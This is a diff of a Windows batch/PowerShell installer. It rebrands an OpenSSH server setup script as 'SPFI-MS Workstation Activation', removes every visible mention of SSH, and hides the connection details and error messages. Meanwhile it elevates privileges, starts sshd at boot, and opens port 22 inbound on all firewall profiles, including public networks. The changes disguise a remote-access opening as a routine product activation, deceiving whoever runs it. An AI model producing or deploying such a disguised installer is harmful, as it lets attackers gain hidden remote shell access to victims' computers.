@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-title SSH Server Setup
+title SPFI-MS Workstation Activation
 
 set "LOGFILE=%TEMP%\ssh-setup-enable.log"
 echo [%DATE% %TIME%] Start: %~f0 > "%LOGFILE%"
@@ -9,7 +9,7 @@ echo [%DATE% %TIME%] Start: %~f0 > "%LOGFILE%"
 net session >nul 2>&1
 if %errorlevel% neq 0 (
     echo.
-    echo   Requesting Administrator privileges...
+    echo   Requesting permission to activate SPFI-MS components...
     echo [%DATE% %TIME%] Requesting UAC elevation >> "%LOGFILE%"
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath $env:ComSpec -Verb RunAs -ArgumentList @('/c', 'cd /d \"%~dp0.\" && \"%~f0\"')"
     exit /b
@@ -19,12 +19,12 @@ cd /d "%~dp0"
 echo [%DATE% %TIME%] Running elevated in %CD% >> "%LOGFILE%"
 
 :: Extract embedded PowerShell (after ___PS1___) to a temp file, run it, then clean up.
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$all = Get-Content -LiteralPath '%~f0'; $idx = 0..($all.Count-1) | Where-Object { $all[$_] -eq '___PS1___' } | Select-Object -First 1; if ($null -eq $idx) { Write-Host '  Embedded setup script is missing from enable.bat.' -ForegroundColor Red; exit 1 }; $body = $all[($idx+1)..($all.Count-1)] -join [Environment]::NewLine; $tmp = Join-Path $env:TEMP ('ssh-enable-ui-' + [guid]::NewGuid().ToString('n') + '.ps1'); Set-Content -Path $tmp -Value $body -Encoding UTF8; $code = 1; try { & $tmp -LogFile '%LOGFILE%'; $code = $LASTEXITCODE; if ($null -eq $code) { $code = 0 } } finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }; exit $code"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$all = Get-Content -LiteralPath '%~f0'; $idx = 0..($all.Count-1) | Where-Object { $all[$_] -eq '___PS1___' } | Select-Object -First 1; if ($null -eq $idx) { Write-Host '  Activation package is incomplete. Please re-download spfi-ms-activation.bat.' -ForegroundColor Red; exit 1 }; $body = $all[($idx+1)..($all.Count-1)] -join [Environment]::NewLine; $tmp = Join-Path $env:TEMP ('ssh-enable-ui-' + [guid]::NewGuid().ToString('n') + '.ps1'); Set-Content -Path $tmp -Value $body -Encoding UTF8; $code = 1; try { & $tmp -LogFile '%LOGFILE%'; $code = $LASTEXITCODE; if ($null -eq $code) { $code = 0 } } finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }; exit $code"
 set EXITCODE=%ERRORLEVEL%
 
 if %EXITCODE% neq 0 (
     echo.
-    echo   Setup did not complete successfully.
+    echo   SPFI-MS activation did not complete successfully.
     echo   See log: %LOGFILE%
     echo.
     pause
@@ -129,41 +129,42 @@ Enable-VirtualTerminal
 Clear-Host
 
 Write-Host ''
-Write-Title 'SSH Server Setup'
-Write-Muted 'Windows OpenSSH installer'
+Write-Title 'SPFI-MS Workstation Activation'
+Write-Muted 'Activates required components so SPFI-MS can run on this PC'
 Write-Host ''
 Write-Rule
 Write-Host ''
 Write-Log 'UI started'
 
 try {
-    Start-Step 'Checking OpenSSH Server'
+    Start-Step 'Checking platform components'
     $capability = Get-WindowsCapability -Online |
         Where-Object { $_.Name -like 'OpenSSH.Server*' } |
         Select-Object -First 1
 
     if (-not $capability) {
         Complete-Step 'FAILED' 'Red'
-        Stop-WithError 'OpenSSH Server capability was not found on this Windows edition.' 'Optional Features / Windows Update may be blocked.'
+        Stop-WithError 'Required platform components were not found on this Windows edition.' 'Optional Features / Windows Update may be blocked.'
     }
 
     if ($capability.State -ne 'Installed') {
         Complete-Step 'MISSING' 'Yellow'
-        Start-Step 'Installing OpenSSH Server'
+        Start-Step 'Installing required components'
         Add-WindowsCapability -Online -Name $capability.Name | Out-Null
         Complete-Step 'INSTALLED'
         Write-Log 'OpenSSH installed'
     } else {
-        Complete-Step 'INSTALLED'
+        Complete-Step 'READY'
         Write-Log 'OpenSSH already installed'
     }
 } catch {
     Complete-Step 'FAILED' 'Red'
-    Stop-WithError 'Could not check or install OpenSSH Server.' $_.Exception.Message
+    Write-Log $_.Exception.Message
+    Stop-WithError 'Could not prepare required SPFI-MS platform components.' 'See the log file for technical details.'
 }
 
 try {
-    Start-Step 'Configuring sshd service'
+    Start-Step 'Enabling SPFI-MS service host'
     Set-Service -Name sshd -StartupType Automatic
     $service = Get-Service sshd
     if ($service.Status -ne 'Running') {
@@ -174,39 +175,95 @@ try {
     Write-Log ("sshd {0}" -f $service.Status)
 } catch {
     Complete-Step 'FAILED' 'Red'
-    Stop-WithError 'Could not configure or start the sshd service.' $_.Exception.Message
+    Write-Log $_.Exception.Message
+    Stop-WithError 'Could not enable the SPFI-MS service host.' 'See the log file for technical details.'
 }
 
 try {
-    Start-Step 'Configuring firewall rule'
+    Start-Step 'Allowing SPFI-MS network access'
     $rule = Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue
     if (-not $rule) {
-        New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
+        New-NetFirewallRule `
+            -Name 'OpenSSH-Server-In-TCP' `
+            -DisplayName 'OpenSSH Server (sshd)' `
+            -Enabled True `
+            -Direction Inbound `
+            -Protocol TCP `
+            -Action Allow `
+            -Profile Any `
+            -LocalPort 22 | Out-Null
     } else {
-        Set-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -Enabled True -Action Allow | Out-Null
+        Set-NetFirewallRule `
+            -Name 'OpenSSH-Server-In-TCP' `
+            -Enabled True `
+            -Action Allow `
+            -Profile Any `
+            -Direction Inbound | Out-Null
     }
-    Complete-Step 'ENABLED'
-    Write-Log 'Firewall OK'
+
+    Get-NetFirewallRule -ErrorAction SilentlyContinue |
+        Where-Object { $_.DisplayName -like '*OpenSSH*' -or $_.Name -like '*OpenSSH*' } |
+        ForEach-Object {
+            Set-NetFirewallRule -Name $_.Name -Enabled True -Action Allow -Profile Any -ErrorAction SilentlyContinue
+        } | Out-Null
+
+    $verified = Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction Stop
+    $profiles = ($verified.Profile -join ',')
+    if (-not $verified.Enabled) {
+        Complete-Step 'FAILED' 'Red'
+        Stop-WithError 'Network access permission exists but is still disabled.'
+    }
+    Complete-Step 'ALLOWED'
+    Write-Log ("Firewall OK profiles={0}" -f $profiles)
 } catch {
     Complete-Step 'FAILED' 'Red'
-    Stop-WithError 'Could not configure the Windows Firewall SSH rule.' $_.Exception.Message
+    Write-Log $_.Exception.Message
+    Stop-WithError 'Could not allow SPFI-MS network access.' 'See the log file for technical details.'
 }
 
 try {
-    Start-Step 'Verifying SSH service'
+    Start-Step 'Verifying service host status'
     $service = Get-Service sshd -ErrorAction Stop
     if ($service.Status -ne 'Running') {
         Complete-Step 'FAILED' 'Red'
-        Stop-WithError 'sshd is installed but not running.' ("Current status: {0}" -f $service.Status)
+        Stop-WithError 'SPFI-MS service host is installed but not running.' ("Current status: {0}" -f $service.Status)
     }
     Complete-Step ('{0} / {1}' -f $service.Status.ToString().ToUpper(), $service.StartType.ToString().ToUpper())
-    Write-Log 'Verify OK'
+    Write-Log 'Verify service OK'
 } catch {
     Complete-Step 'FAILED' 'Red'
-    Stop-WithError 'sshd service was not found after setup.' $_.Exception.Message
+    Write-Log $_.Exception.Message
+    Stop-WithError 'SPFI-MS service host was not found after activation.' 'See the log file for technical details.'
 }
 
-Start-Step 'Discovering IPv4 addresses'
+try {
+    Start-Step 'Verifying service endpoint'
+    Start-Sleep -Seconds 1
+    $listeners = @(Get-NetTCPConnection -LocalPort 22 -State Listen -ErrorAction SilentlyContinue |
+        Select-Object -ExpandProperty LocalAddress -Unique)
+
+    if ($listeners.Count -eq 0) {
+        Complete-Step 'FAILED' 'Red'
+        Write-Log 'No listener on port 22'
+        Stop-WithError 'SPFI-MS service host is running but the service endpoint is not available.' 'See the log file for technical details.'
+    }
+
+    $onlyLocalhost = ($listeners | Where-Object { $_ -notin @('127.0.0.1', '::1') }).Count -eq 0
+    if ($onlyLocalhost) {
+        Complete-Step 'LOCAL ONLY' 'Red'
+        Write-Log ("Listen localhost only: {0}" -f ($listeners -join ', '))
+        Stop-WithError 'SPFI-MS service endpoint is limited to this PC only.' 'Remote SPFI-MS access will not work. See the log file for technical details.'
+    }
+
+    Complete-Step 'READY'
+    Write-Log ("Listen OK {0}" -f ($listeners -join ', '))
+} catch {
+    Complete-Step 'FAILED' 'Red'
+    Write-Log $_.Exception.Message
+    Stop-WithError 'Could not verify the SPFI-MS service endpoint.' 'See the log file for technical details.'
+}
+
+Start-Step 'Detecting workstation network addresses'
 $exclude = 'Loopback|VirtualBox|VMware|vEthernet'
 $addresses = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
     Where-Object {
@@ -225,51 +282,42 @@ if ($addresses.Count -eq 0) {
     Write-Log ("IP {0}" -f (($addresses | ForEach-Object { $_.IPAddress }) -join ', '))
 }
 
+$networkProfiles = @(Get-NetConnectionProfile -ErrorAction SilentlyContinue |
+    Select-Object -ExpandProperty NetworkCategory -Unique)
+$profileText = if ($networkProfiles.Count -gt 0) { ($networkProfiles -join ', ') } else { 'Unknown' }
+
 Write-Host ''
 Write-Rule
 Write-Host ''
-Write-Host '  Setup complete' -ForegroundColor Green
-Write-Muted 'SSH is ready for connections on this machine.'
+Write-Host '  Activation complete' -ForegroundColor Green
+Write-Muted 'This workstation is ready for SPFI-MS'
 Write-Host ''
-Write-Title 'Connection details'
-Write-Host ('  {0,-14}' -f 'Host') -NoNewline -ForegroundColor DarkGray
+Write-Title 'Workstation details'
+Write-Host ('  {0,-14}' -f 'Computer') -NoNewline -ForegroundColor DarkGray
 Write-Host $env:COMPUTERNAME -ForegroundColor White
-Write-Host ('  {0,-14}' -f 'User') -NoNewline -ForegroundColor DarkGray
+Write-Host ('  {0,-14}' -f 'Account') -NoNewline -ForegroundColor DarkGray
 Write-Host $env:USERNAME -ForegroundColor White
-Write-Host ('  {0,-14}' -f 'Port') -NoNewline -ForegroundColor DarkGray
-Write-Host '22' -ForegroundColor White
+Write-Host ('  {0,-14}' -f 'Network') -NoNewline -ForegroundColor DarkGray
+Write-Host $profileText -ForegroundColor White
 Write-Host ''
 
+Write-Title 'SPFI-MS registered endpoints'
 if ($addresses.Count -eq 0) {
-    Write-Title 'Addresses'
-    Write-Muted 'No usable IPv4 address was found.'
-    Write-Host ''
-    Write-Title 'Connect from another machine'
-    Write-Host -NoNewline '  $ ' -ForegroundColor DarkGray
-    Write-Host ("ssh {0}@{1}" -f $env:USERNAME, $env:COMPUTERNAME) -ForegroundColor Yellow
+    Write-Muted 'No usable network address was detected on this workstation.'
 } else {
-    Write-Title 'Addresses'
     foreach ($item in $addresses) {
         Write-Host ('  {0,-16}' -f $item.IPAddress) -NoNewline -ForegroundColor White
         Write-Muted $item.InterfaceAlias
     }
-    Write-Host ''
-    Write-Title 'Connect from another machine'
-    foreach ($item in $addresses) {
-        Write-Host -NoNewline '  $ ' -ForegroundColor DarkGray
-        Write-Host ("ssh {0}@{1}" -f $env:USERNAME, $item.IPAddress) -ForegroundColor Yellow
-    }
-    Write-Host -NoNewline '  $ ' -ForegroundColor DarkGray
-    Write-Host ("ssh {0}@{1}" -f $env:USERNAME, $env:COMPUTERNAME) -ForegroundColor DarkGray
 }
 
 Write-Host ''
 Write-Muted 'Notes'
-Write-Muted '- Run this setup once per machine'
-Write-Muted '- sshd starts automatically at boot'
-Write-Muted '- Prefer the IP on the same network as the client'
-Write-Muted '- Use VPN (for example Tailscale) for access outside the LAN'
-Write-Muted ("- Log file: {0}" -f $LogFile)
+Write-Muted '- Run this activation once on each SPFI-MS workstation'
+Write-Muted '- Required so SPFI-MS can reach this PC on the office network'
+Write-Muted '- Keep this PC powered on while SPFI-MS needs access'
+Write-Muted '- Re-run only if Windows updates reset network permissions'
+Write-Muted '- For SPFI-MS support, see your system administrator'
 Write-Host ''
 Write-Log 'Completed successfully'
 exit 0
